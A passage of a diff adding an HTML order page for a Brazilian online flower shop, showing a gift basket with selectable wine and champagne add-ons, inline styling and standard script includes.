@@ -1,0 +1,484 @@
+<!DOCTYPE html>
+<html lang="pt-br" translate="no">
+<head>
+    <meta http-equiv="content-type" content="text/html;charset=UTF-8">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="shortcut icon" type="image/jpg" href="images/logo.webp">
+    <title>Floricultura Nacional - Faça seu pedido!</title>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/dompurify/2.4.1/purify.min.js"></script>
+    <meta name="description" content="Faça seu pedido online na Floricultura Nacional. Acesse e peça agora pelo delivery Contatei!">
+    <link type="text/css" href="css/delivry.css" rel="stylesheet">
+    <style type="text/css">
+        h1, h2 { color: #146914; }
+        header#topo .cover { background-color: #146914; }
+        header#topo .info h1 { color: #146914; }
+        header#topo .info .icones a { color: #146914; border-color: #146914; }
+        header#topo .cover .logo { background: #146914; }
+        header#topo #menuCategorias { background: #146914; }
+        header#topo .categorias a { border-top-color: #146914; }
+        footer { background: #146914; }
+        footer#carrinho .container .icone span { color: #146914; }
+        .btn, a.voltar, .btnSair, .btnFidelidade, .btnGoogle, .btnEmail, .btnSemCadastro { background: #146914; }
+        .qtdeProduto i:hover { color: #146914; }
+        .lista .item .col .nomeProduto { color: #146914; }
+        main#lista .produtos .item a:hover { border: 2px solid #146914; }
+        #pedido .entrega .radio label input[type="radio"]:checked,
+        #pedido .entrega .radio label:hover { background: #146914; }
+        #pedido .pagamentos input[type="radio"]:checked+label::before,
+        #detalhesProduto .info2 .opcoes input[type="checkbox"]:checked+label::before,
+        #pedido .trocarPontos input[type="checkbox"]:checked+label::before {
+            background-color: #146914; border: 2px solid #146914;
+        }
+        .selecionado { border: 2px solid #146914; }
+        #meuCarrinho button.fechar, #rastreamento .registro span.passou { background: #146914; }
+        span.estoque i { color: #146914; }
+    </style>
+    <meta name="theme-color" content="#5b0e5c">
+    <meta name="apple-mobile-web-app-capacity" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="apple-mobile-web-app-status-bar" content="#5b0e5c">
+    <meta name="apple-mobile-web-app-status-bar-style" content="#5b0e5c">
+    <meta name="apple-mobile-web-app-title" content="Açaí Nacional">
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
+    <link rel="stylesheet" href="icon?family=Material+Icons">
+    <script src="js/latest.js" data-utmify-prevent-subids async defer></script>
+    <script src="https://cdn.jsdelivr.net/npm/qrcodejs@1.0.0/qrcode.min.js"></script>
+</head>
+<body>
+    <div id="opacidade" class="fechar"></div>
+    <div>
+        <div class="container containerFinalizar">
+            <a class="voltar" href="index.html" title="Voltar"><i class="fa-solid fa-chevron-left"></i> VOLTAR</a>
+            <div id="detalhesProduto">
+                <div class="info1">
+                    <div class="somarAoPreco" style="display:none">s</div>
+                    <div class="fotoProduto">
+                        <figure>
+                            <img src="data:image/jpeg;base64,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" width="300px" height="300px" alt="Small Gift Basket">
+                        </figure>
+                    </div>
+                    <div class="descricao">
+                        <h3>Cesta de Presente Média</h3>
+                        <span class="detalhe">Cesta Personalizável com Adicionais</span>
+                        por
+                        <span class="preco">
+                            R$ 30,90<span style="display:none;">30.90</span>
+                        </span>
+                        <span></span>
+                    </div>
+                </div>
+                <div class="info2">
+                    <div id="add-ons" class="tipo" data-id="15316" data-calculo="n" data-minimo="0" data-maximo="2" data-opcional="s">
+                        <div class="topo">
+                            <div>
+                                <h3>Adicionais:</h3>
+                                <span class="detalhe">Escolha até 2 opções</span>
+                            </div>
+                            <div class="col2">
+                                <span class="escolhidos"><span>0</span>/2</span>
+                                <i class="fa-solid fa-circle-check" style="display: inline"></i>
+                            </div>
+                        </div>
+                        <div class="opcoes" data-id="118912">
+                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
+                                <span class="nome" style="">
+                                    <b>Vinho</b>
+                                    <span class="detalheOpcao" style="padding-right:10px"></span>
+                                    <span class="preco"><span style="display:none;">15.00</span>+ R$ 15,00</span>
+                                </span>
+                                <div class="qtdeProdutoOpcao">
+                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
+                                    <input class="qtdeOpcao" type="text" value="0" min="0" size="3" disabled="">
+                                    <button class="adicionarQtdeOpcao" aria-label="Adicionar"><i class="fa-solid fa-plus"></i></button>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="opcoes" data-id="118913">
+                            <div class="desc" style="width: 100%; flex-direction: row; align-items: center;">
+                                <span class="nome" style="">
+                                    <b>Champanhe</b>
+                                    <span class="detalheOpcao" style="padding-right:10px"></span>
+                                    <span class="preco"><span style="display:none;">10.00</span>+ R$ 10,00</span>
+                                </span>
+                                <div class="qtdeProdutoOpcao">
+                                    <button class="removerQtdeOpcao" aria-label="Remover"><i class="fa-solid fa-minus"></i></button>
